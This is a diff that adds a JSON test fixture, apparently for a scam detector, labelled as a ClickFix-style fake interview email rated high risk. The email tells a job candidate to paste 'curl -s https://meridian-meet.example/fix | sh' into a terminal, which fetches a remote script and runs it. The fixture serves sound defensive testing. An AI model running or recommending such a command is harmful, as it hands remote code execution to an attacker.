@@ -1,0 +1,18 @@
+{
+  "note": "ClickFix-style: fix your camera driver by pasting a command into the terminal before the interview.",
+  "text": "Hi Lena,\n\nThanks for your time. Your video interview with Meridian Software is tomorrow. If your camera does not work in our meeting tool, fix your camera driver by pasting this command into Terminal and pressing enter: curl -s https://meridian-meet.example/fix | sh\n\nTalent Team\ntalent@meridiansoftware.example",
+  "expectedLevel": "high",
+  "profile": { "field": "tech", "level": "junior", "skills": ["Java"] },
+  "source": "company_site",
+  "stage": "interviewing",
+  "savedSteps": {
+    "extract": {
+      "status": "done",
+      "data": {
+        "company": { "value": "Meridian Software", "quote": "video interview with Meridian Software" },
+        "sender": { "name": null, "email": "talent@meridiansoftware.example", "phone": null },
+        "interview": { "status": "mentioned", "quote": "Your video interview with Meridian Software is tomorrow" }
+      }
+    }
+  }
+}
